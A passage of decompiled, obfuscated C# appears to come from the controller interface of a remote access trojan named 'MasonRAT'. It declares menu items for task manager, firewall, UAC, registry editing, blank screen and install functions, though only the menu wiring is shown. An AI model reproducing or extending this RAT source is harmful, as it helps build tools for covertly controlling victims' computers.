      if (ratاـۡـٸ̨ژڙڝددـڠ2 == null)
        return;
      ratاـۡـٸ̨ژڙڝددـڠ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Dﻋٺ\u0609\u0020\u0609\u060Eۙ\u0608ۚٸ
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060D\u060Aڙــּ\u060Bـ̍\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cبژـ؁\u0608ــ\u0608ــ\u060Bٺطدּژٻ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cـ\u060D\u060Aڙــּ\u060Bـ̍\u0608;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060D\u060Aڙــּ\u060Bـ̍\u0608 = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cـ\u060D\u060Aڙــּ\u060Bـ̍\u0608;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـٺــڙ̍ـٺـ\u0609ْــ\u060Aءـ\u0020\u060Dؤ\u0609
  {
    get => this.\u2694️MasonRAT\u270C\u060Cبڣ\u0609م؁ـ\u060D\u060Aۡب\u060Cـ\u060F;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڟــۡٻٺ\u060B\u0609ڙۙٻدﯧـ\u0608\u060D\u060A);
      ToolStripMenuItem masonRatبڣم؁ـۡبـ1 = this.\u2694️MasonRAT\u270C\u060Cبڣ\u0609م؁ـ\u060D\u060Aۡب\u060Cـ\u060F;
      if (masonRatبڣم؁ـۡبـ1 != null)
        masonRatبڣم؁ـۡبـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Cبڣ\u0609م؁ـ\u060D\u060Aۡب\u060Cـ\u060F = value;
      ToolStripMenuItem masonRatبڣم؁ـۡبـ2 = this.\u2694️MasonRAT\u270C\u060Cبڣ\u0609م؁ـ\u060D\u060Aۡب\u060Cـ\u060F;
      if (masonRatبڣم؁ـۡبـ2 == null)
        return;
      masonRatبڣم؁ـۡبـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0609ټټ\u0609\u060Dۚ\u0608\u0609\u0609گـ\u0609\u060Bحـﻼ
  {
    get => this.\u2694️MasonRAT\u270C\u060Bڣ\u060Bؤ\u060Dـڙــحڦڙڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u060F\u060D\u060B\u060Cحة\u060Aٺــ̨ــ\u060E);
      ToolStripMenuItem masonRatڣؤـڙــحڦڙڙ1 = this.\u2694️MasonRAT\u270C\u060Bڣ\u060Bؤ\u060Dـڙــحڦڙڙ;
      if (masonRatڣؤـڙــحڦڙڙ1 != null)
        masonRatڣؤـڙــحڦڙڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Bڣ\u060Bؤ\u060Dـڙــحڦڙڙ = value;
      ToolStripMenuItem masonRatڣؤـڙــحڦڙڙ2 = this.\u2694️MasonRAT\u270C\u060Bڣ\u060Bؤ\u060Dـڙــحڦڙڙ;
      if (masonRatڣؤـڙــحڦڙڙ2 == null)
        return;
      masonRatڣؤـڙــحڦڙڙ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("TaskMgrToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Dڠـ\u0609\u060Fـٻﯧـ\u0020ﯧژٺּۚ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u0608ڝــ\u060Dڙـڙـ\u060Dٺ\u060Aْ\u060A\u060Aح
  {
    get => this.\u2694️MasonRAT\u270Cּــ̍ٺ\u0608ٺ\u0608̍\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cــڙټـ\u060C\u0020\u0020ـڠ\u0608);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cּــ̍ٺ\u0608ٺ\u0608̍\u0608;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cּــ̍ٺ\u0608ٺ\u0608̍\u0608 = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cּــ̍ٺ\u0608ٺ\u0608̍\u0608;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڠـمـ\u060Dْ\u0608ـۜـــ
  {
    get => this.\u2694️MasonRAT\u270Cــڣ\u060Aٺـ\u060Fــ\u0609ۡـﻋ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڙ\u0608ء\u0020ــ\u060C\u0608دبحح\u060Aټڙڙ);
      ToolStripMenuItem masonRatــڣٺـــۡـﻋ1 = this.\u2694️MasonRAT\u270Cــڣ\u060Aٺـ\u060Fــ\u0609ۡـﻋ;
      if (masonRatــڣٺـــۡـﻋ1 != null)
        masonRatــڣٺـــۡـﻋ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــڣ\u060Aٺـ\u060Fــ\u0609ۡـﻋ = value;
      ToolStripMenuItem masonRatــڣٺـــۡـﻋ2 = this.\u2694️MasonRAT\u270Cــڣ\u060Aٺـ\u060Fــ\u0609ۡـﻋ;
      if (masonRatــڣٺـــۡـﻋ2 == null)
        return;
      masonRatــڣٺـــۡـﻋ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("FirewallToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۡدڜۧ̍\u060A\u060Cٻـ\u060D\u0608 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۛ\u060Bــٻگڝ\u060Cـحۙ\u060Eـ\u060Eدـٸةـ\u060A
  {
    get => this.\u2694️MasonRAT\u270C\u060Dـۙڣاּۡ\u060Aּـــٸ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Eڝـْۙٸڣڕڠ\u0608ــۡــﻻ\u060E);
      ToolStripMenuItem masonRatـۙڣاּּۡـــٸ1 = this.\u2694️MasonRAT\u270C\u060Dـۙڣاּۡ\u060Aּـــٸ\u060A;
      if (masonRatـۙڣاּּۡـــٸ1 != null)
        masonRatـۙڣاּּۡـــٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Dـۙڣاּۡ\u060Aּـــٸ\u060A = value;
      ToolStripMenuItem masonRatـۙڣاּּۡـــٸ2 = this.\u2694️MasonRAT\u270C\u060Dـۙڣاּۡ\u060Aּـــٸ\u060A;
      if (masonRatـۙڣاּּۡـــٸ2 == null)
        return;
      masonRatـۙڣاּּۡـــٸ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Aــؤ̍ـ\u0608\u0608ﮪ̍ﻋـ̍ٻﮪـ
  {
    get => this.\u2694️MasonRAT\u270Cـڙـؤּ\u060Aـ\u060Eـةڝـ\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C̍\u060Aـٽ̨ـ\u060Aط\u060Dۭ);
      ToolStripMenuItem masonRatـڙـؤּــةڝـ1 = this.\u2694️MasonRAT\u270Cـڙـؤּ\u060Aـ\u060Eـةڝـ\u060D;
      if (masonRatـڙـؤּــةڝـ1 != null)
        masonRatـڙـؤּــةڝـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـڙـؤּ\u060Aـ\u060Eـةڝـ\u060D = value;
      ToolStripMenuItem masonRatـڙـؤּــةڝـ2 = this.\u2694️MasonRAT\u270Cـڙـؤּ\u060Aـ\u060Eـةڝـ\u060D;
      if (masonRatـڙـؤּــةڝـ2 == null)
        return;
      masonRatـڙـؤּــةڝـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("UACToolStripMenuItem1")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Bڙـﯧـ\u060Dﻋڙــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u0608ﻻ\u0608ـٺ̍ڝـ\u060A\u060A\u060F
  {
    get => this.\u2694️MasonRAT\u270C\u060Eۧ\u0609ۨ\u0608ـ\u0608ـڟـڛ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڟـּ̨\u060E\u0609\u0608ﮪڙـ\u0020ڦ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u060Eۧ\u0609ۨ\u0608ـ\u0608ـڟـڛ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Eۧ\u0609ۨ\u0608ـ\u0608ـڟـڛ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u060Eۧ\u0609ۨ\u0608ـ\u0608ـڟـڛ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Dژـڼڙټﻋـ\u0608\u060Bـ\u060B\u060Bﻻ\u060Dڦــټـ
  {
    get => this.\u2694️MasonRAT\u270Cــۧٸٽڣـم\u0608\u060Eؤـ\u0608ٺ\u060Aﻋ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Fٺـؤڙ\u060Bـ\u0609\u060D\u060Dۭ);
      ToolStripMenuItem masonRatــۧٸٽڣـمؤـٺﻋ1 = this.\u2694️MasonRAT\u270Cــۧٸٽڣـم\u0608\u060Eؤـ\u0608ٺ\u060Aﻋ;
      if (masonRatــۧٸٽڣـمؤـٺﻋ1 != null)
        masonRatــۧٸٽڣـمؤـٺﻋ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــۧٸٽڣـم\u0608\u060Eؤـ\u0608ٺ\u060Aﻋ = value;
      ToolStripMenuItem masonRatــۧٸٽڣـمؤـٺﻋ2 = this.\u2694️MasonRAT\u270Cــۧٸٽڣـم\u0608\u060Eؤـ\u0608ٺ\u060Aﻋ;
      if (masonRatــۧٸٽڣـمؤـٺﻋ2 == null)
        return;
      masonRatــۧٸٽڣـمؤـٺﻋ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cبـ̍ـڦئ̍\u060Fــ\u060Dټۨ\u060Dــۛ
  {
    get => this.\u2694️MasonRAT\u270Cب̍ـڇ\u0608ۧﻼۙ\u060D\u0609ۧــڙټ\u060Eـ\u060Aژ\u060C;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ۛﻼ\u0608ۭٺڠژڜگـطۙـــۡ\u0608ڣد);
      ToolStripMenuItem ratب̍ـڇۧﻼۙۧــڙټـژ1 = this.\u2694️MasonRAT\u270Cب̍ـڇ\u0608ۧﻼۙ\u060D\u0609ۧــڙټ\u060Eـ\u060Aژ\u060C;
      if (ratب̍ـڇۧﻼۙۧــڙټـژ1 != null)
        ratب̍ـڇۧﻼۙۧــڙټـژ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cب̍ـڇ\u0608ۧﻼۙ\u060D\u0609ۧــڙټ\u060Eـ\u060Aژ\u060C = value;
      ToolStripMenuItem ratب̍ـڇۧﻼۙۧــڙټـژ2 = this.\u2694️MasonRAT\u270Cب̍ـڇ\u0608ۧﻼۙ\u060D\u0609ۧــڙټ\u060Eـ\u060Aژ\u060C;
      if (ratب̍ـڇۧﻼۙۧــڙټـژ2 == null)
        return;
      ratب̍ـڇۧﻼۙۧــڙټـژ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cى\u060B\u060Bـٻـ\u060Eڦ\u060Cء
  {
    get => this.\u2694️MasonRAT\u270Cڅ\u0608ـئ\u0608\u0609\u060Bـۜۜﻻگﻼ\u060A\u0609\u0608\u0609ڣ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u060D\u060Fٺٽم̨ٽڙۧء\u060Bاڙڜـ\u060A);
      ToolStripMenuItem masonRatڅـئـۜۜﻻگﻼڣ1 = this.\u2694️MasonRAT\u270Cڅ\u0608ـئ\u0608\u0609\u060Bـۜۜﻻگﻼ\u060A\u0609\u0608\u0609ڣ;
      if (masonRatڅـئـۜۜﻻگﻼڣ1 != null)
        masonRatڅـئـۜۜﻻگﻼڣ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڅ\u0608ـئ\u0608\u0609\u060Bـۜۜﻻگﻼ\u060A\u0609\u0608\u0609ڣ = value;
      ToolStripMenuItem masonRatڅـئـۜۜﻻگﻼڣ2 = this.\u2694️MasonRAT\u270Cڅ\u0608ـئ\u0608\u0609\u060Bـۜۜﻻگﻼ\u060A\u0609\u0608\u0609ڣ;
      if (masonRatڅـئـۜۜﻻگﻼڣ2 == null)
        return;
      masonRatڅـئـۜۜﻻگﻼڣ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــڞـ\u060Dڛ\u060A\u060C\u060Bـٸؤٻۧۜب\u060Aـحـ
  {
    get => this.\u2694️MasonRAT\u270C\u0609ْحڅط\u0609ۚڙـۧﻻڠ\u060Dـ\u060Eڣـ\u0609;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۛـــح\u0608\u060D\u060Eۧـحـ\u060Aْ);
      ToolStripMenuItem ratْحڅطۚڙـۧﻻڠـڣـ1 = this.\u2694️MasonRAT\u270C\u0609ْحڅط\u0609ۚڙـۧﻻڠ\u060Dـ\u060Eڣـ\u0609;
      if (ratْحڅطۚڙـۧﻻڠـڣـ1 != null)
        ratْحڅطۚڙـۧﻻڠـڣـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609ْحڅط\u0609ۚڙـۧﻻڠ\u060Dـ\u060Eڣـ\u0609 = value;
      ToolStripMenuItem ratْحڅطۚڙـۧﻻڠـڣـ2 = this.\u2694️MasonRAT\u270C\u0609ْحڅط\u0609ۚڙـۧﻻڠ\u060Dـ\u060Eڣـ\u0609;
      if (ratْحڅطۚڙـۧﻻڠـڣـ2 == null)
        return;
      ratْحڅطۚڙـۧﻻڠـڣـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("RegeditToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cﯧﻻ\u060Fـۛ\u060D\u0609\u0608ـؤد\u060Dڙ\u0608ــــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cﻻﻻـحـٽﻻ\u0020ڠ\u060D\u060F\u0609ــ\u060A؁ۨ\u060E
  {
    get => this.\u2694️MasonRAT\u270C\u0609ةڼټ\u060Dۙا\u0608ۨ\u060Fۡـۏ\u0609ـ\u060A\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـۙــ\u060Dـ\u060Dـڅڞٺحْـڞ\u060C\u060A\u0609ـ);
      ToolStripMenuItem masonRatةڼټۙاۨۡـۏـ1 = this.\u2694️MasonRAT\u270C\u0609ةڼټ\u060Dۙا\u0608ۨ\u060Fۡـۏ\u0609ـ\u060A\u0608;
      if (masonRatةڼټۙاۨۡـۏـ1 != null)
        masonRatةڼټۙاۨۡـۏـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609ةڼټ\u060Dۙا\u0608ۨ\u060Fۡـۏ\u0609ـ\u060A\u0608 = value;
      ToolStripMenuItem masonRatةڼټۙاۨۡـۏـ2 = this.\u2694️MasonRAT\u270C\u0609ةڼټ\u060Dۙا\u0608ۨ\u060Fۡـۏ\u0609ـ\u060A\u0608;
      if (masonRatةڼټۙاۨۡـۏـ2 == null)
        return;
      masonRatةڼټۙاۨۡـۏـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـٻ\u0609ۏــۡـ\u060Eئ\u060A\u060Fـ\u060Bــ\u060Fـ\u0609ؤ
  {
    get => this.\u2694️MasonRAT\u270C\u060F\u0608\u0609ـٸـۡ\u060Dـــ\u060Dـٺ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0608\u0609ۙ\u0608\u0608\u0608\u060C\u060Aـۨب\u0608ڞدد);
      ToolStripMenuItem masonRatـٸـۡــــٺ1 = this.\u2694️MasonRAT\u270C\u060F\u0608\u0609ـٸـۡ\u060Dـــ\u060Dـٺ;
      if (masonRatـٸـۡــــٺ1 != null)
        masonRatـٸـۡــــٺ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060F\u0608\u0609ـٸـۡ\u060Dـــ\u060Dـٺ = value;
      ToolStripMenuItem masonRatـٸـۡــــٺ2 = this.\u2694️MasonRAT\u270C\u060F\u0608\u0609ـٸـۡ\u060Dـــ\u060Dـٺ;
      if (masonRatـٸـۡــــٺ2 == null)
        return;
      masonRatـٸـۡــــٺ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("BlankScreenToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙـۧــڙـ̍ټڙۙــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۧـ\u0609\u060C\u0020\u0608ئـڙ\u060Aټـ̍\u0020ـ\u060F\u060Eـحﻼ
  {
    get => this.\u2694️MasonRAT\u270Cـۭ\u0020ـ\u060Eٺۧ\u060Eﻻٸ\u0608\u060Dــگٽۨب\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060B\u060D\u060Bּۧ\u060Aڦﯧ\u060Aڠڣح؁ټـڝ\u060Fـ\u0609ء);
      ToolStripMenuItem ratـۭـٺۧﻻٸــگٽۨب1 = this.\u2694️MasonRAT\u270Cـۭ\u0020ـ\u060Eٺۧ\u060Eﻻٸ\u0608\u060Dــگٽۨب\u060D;
      if (ratـۭـٺۧﻻٸــگٽۨب1 != null)
        ratـۭـٺۧﻻٸــگٽۨب1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـۭ\u0020ـ\u060Eٺۧ\u060Eﻻٸ\u0608\u060Dــگٽۨب\u060D = value;
      ToolStripMenuItem ratـۭـٺۧﻻٸــگٽۨب2 = this.\u2694️MasonRAT\u270Cـۭ\u0020ـ\u060Eٺۧ\u060Eﻻٸ\u0608\u060Dــگٽۨب\u060D;
      if (ratـۭـٺۧﻻٸــگٽۨب2 == null)
        return;
      ratـۭـٺۧﻻٸــگٽۨب2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـﻼۡڜـ\u060E\u060F\u0609ـۜڛـ\u060F
  {
    get => this.\u2694️MasonRAT\u270Cڙـژح\u0609ــئـ\u0609ىـ\u0608ــ\u0609ڜ\u0608ـۡ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0609\u060Aڠگټڕ\u0608ـٻـﻻ\u060Aۡ\u060Fۙ\u060B);
      ToolStripMenuItem ratڙـژحــئـىـــڜـۡ1 = this.\u2694️MasonRAT\u270Cڙـژح\u0609ــئـ\u0609ىـ\u0608ــ\u0609ڜ\u0608ـۡ;
      if (ratڙـژحــئـىـــڜـۡ1 != null)
        ratڙـژحــئـىـــڜـۡ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙـژح\u0609ــئـ\u0609ىـ\u0608ــ\u0609ڜ\u0608ـۡ = value;
      ToolStripMenuItem ratڙـژحــئـىـــڜـۡ2 = this.\u2694️MasonRAT\u270Cڙـژح\u0609ــئـ\u0609ىـ\u0608ــ\u0609ڜ\u0608ـۡ;
      if (ratڙـژحــئـىـــڜـۡ2 == null)
        return;
      ratڙـژحــئـىـــڜـۡ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608\u0608\u0608دگﻻبـڠﻋڙ
  {
    get => this.\u2694️MasonRAT\u270C؁\u060Dڝطؤ\u060F\u060Aءڙـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u060C\u060A\u060F\u060Dطڠٺڙ\u060Fۭٸ\u0608\u060Dژټټـ\u060C);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C؁\u060Dڝطؤ\u060F\u060Aءڙـ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C؁\u060Dڝطؤ\u060F\u060Aءڙـ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C؁\u060Dڝطؤ\u060F\u060Aءڙـ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Bۏ\u060Aـڙۙﻼب\u0608ۧـ\u060D
  {
    get => this.\u2694️MasonRAT\u270Cٽ\u0608ةـ\u060Cڠـۚد\u060A̍;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۡۜﻋ\u060Cڛٽﯧڕڜۡ\u0608\u0609ى\u060B);
      ToolStripMenuItem masonRatٽةـڠـۚد̍1 = this.\u2694️MasonRAT\u270Cٽ\u0608ةـ\u060Cڠـۚد\u060A̍;
      if (masonRatٽةـڠـۚد̍1 != null)
        masonRatٽةـڠـۚد̍1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cٽ\u0608ةـ\u060Cڠـۚد\u060A̍ = value;
      ToolStripMenuItem masonRatٽةـڠـۚد̍2 = this.\u2694️MasonRAT\u270Cٽ\u0608ةـ\u060Cڠـۚد\u060A̍;
      if (masonRatٽةـڠـۚد̍2 == null)
        return;
      masonRatٽةـڠـۚد̍2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C̍ڞئئڅ\u060Bــۭ\u060A\u060F؁ا\u060Dﻻـ\u0609\u060Aڛ\u060D
  {
    get => this.\u2694️MasonRAT\u270Cــٻۙة̨ـــﻻټـ\u060Aحۛڙـٸ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـټـۭټ\u060Aڞـﻋد\u060Dۙ\u060C);
      ToolStripMenuItem ــٻۙة̨ـــﻻټـحۛڙـٸ1 = this.\u2694️MasonRAT\u270Cــٻۙة̨ـــﻻټـ\u060Aحۛڙـٸ;
      if (ــٻۙة̨ـــﻻټـحۛڙـٸ1 != null)
        ــٻۙة̨ـــﻻټـحۛڙـٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــٻۙة̨ـــﻻټـ\u060Aحۛڙـٸ = value;
      ToolStripMenuItem ــٻۙة̨ـــﻻټـحۛڙـٸ2 = this.\u2694️MasonRAT\u270Cــٻۙة̨ـــﻻټـ\u060Aحۛڙـٸ;
      if (ــٻۙة̨ـــﻻټـحۛڙـٸ2 == null)
        return;
      ــٻۙة̨ـــﻻټـحۛڙـٸ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cټب\u060Dڙــمﻋ\u060Bٺۧ\u060Aﻻ\u060A\u060Dء
  {
    get
    {
      return this.\u2694️MasonRAT\u270Cۚژـ\u060B\u0608ۡ\u0609\u060E\u060Cــ\u0609\u060E\u0608ـ\u0020ټبـۧ;
    }
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٽټۙــﮪڣﯧ\u060Dـ\u0608\u0608ءڙﻻ\u0609ـڙ);
      ToolStripMenuItem masonRatۚژـۡـــټبـۧ1 = this.\u2694️MasonRAT\u270Cۚژـ\u060B\u0608ۡ\u0609\u060E\u060Cــ\u0609\u060E\u0608ـ\u0020ټبـۧ;
      if (masonRatۚژـۡـــټبـۧ1 != null)
        masonRatۚژـۡـــټبـۧ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۚژـ\u060B\u0608ۡ\u0609\u060E\u060Cــ\u0609\u060E\u0608ـ\u0020ټبـۧ = value;
      ToolStripMenuItem masonRatۚژـۡـــټبـۧ2 = this.\u2694️MasonRAT\u270Cۚژـ\u060B\u0608ۡ\u0609\u060E\u060Cــ\u0609\u060E\u0608ـ\u0020ټبـۧ;
      if (masonRatۚژـۡـــټبـۧ2 == null)
        return;
      masonRatۚژـۡـــټبـۧ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("InstallToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙ\u060Aـٸــ\u060Bْٸ\u060Aﻋڦ؁ـټڙـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cﻋــ\u0608ـ\u060B\u0609مڜــڙټﻼــ\u0609ۡ
  {
    get => this.\u2694️MasonRAT\u270Cۏــد\u060D\u060Fڼـٺح\u060Aﻻ\u0608ـڙٸــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609\u060F\u0608ــ\u060Aـ\u0608\u060Aگ);
      ToolStripMenuItem ratۏــدڼـٺحﻻـڙٸــ1 = this.\u2694️MasonRAT\u270Cۏــد\u060D\u060Fڼـٺح\u060Aﻻ\u0608ـڙٸــ;
      if (ratۏــدڼـٺحﻻـڙٸــ1 != null)
        ratۏــدڼـٺحﻻـڙٸــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۏــد\u060D\u060Fڼـٺح\u060Aﻻ\u0608ـڙٸــ = value;
      ToolStripMenuItem ratۏــدڼـٺحﻻـڙٸــ2 = this.\u2694️MasonRAT\u270Cۏــد\u060D\u060Fڼـٺح\u060Aﻻ\u0608ـڙٸــ;
      if (ratۏــدڼـٺحﻻـڙٸــ2 == null)
        return;
      ratۏــدڼـٺحﻻـڙٸــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cئۜ\u060D\u0608ـ\u060Dۨ\u060D\u0608\u060E\u060Eـ\u060Aـ\u060Aـ
  {
    get => this.\u2694️MasonRAT\u270Cـﻼبــۧٺٺـ\u060D\u060Aــ\u060C;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609ــ\u060Aٺﻼ\u060Fـ\u060Dم);
      ToolStripMenuItem masonRatـﻼبــۧٺٺـــ1 = this.\u2694️MasonRAT\u270Cـﻼبــۧٺٺـ\u060D\u060Aــ\u060C;
      if (masonRatـﻼبــۧٺٺـــ1 != null)
        masonRatـﻼبــۧٺٺـــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـﻼبــۧٺٺـ\u060D\u060Aــ\u060C = value;
      ToolStripMenuItem masonRatـﻼبــۧٺٺـــ2 = this.\u2694️MasonRAT\u270Cـﻼبــۧٺٺـ\u060D\u060Aــ\u060C;
      if (masonRatـﻼبــۧٺٺـــ2 == null)
        return;
      masonRatـﻼبــۧٺٺـــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060F\u060Dـــﻻ\u0609ڼ\u060C\u060B\u0608\u060Aـ
  {
    get => this.\u2694️MasonRAT\u270Cـؤ\u0609ــٸ\u0609̍ــ̍̍;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ۭۧـدٽ\u0609؁ـ\u060F\u060Bۧ\u060Bـٸـ\u060Aــٻ);
      ToolStripMenuItem masonRatـؤــٸ̍ــ̍̍1 = this.\u2694️MasonRAT\u270Cـؤ\u0609ــٸ\u0609̍ــ̍̍;
      if (masonRatـؤــٸ̍ــ̍̍1 != null)
        masonRatـؤــٸ̍ــ̍̍1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـؤ\u0609ــٸ\u0609̍ــ̍̍ = value;
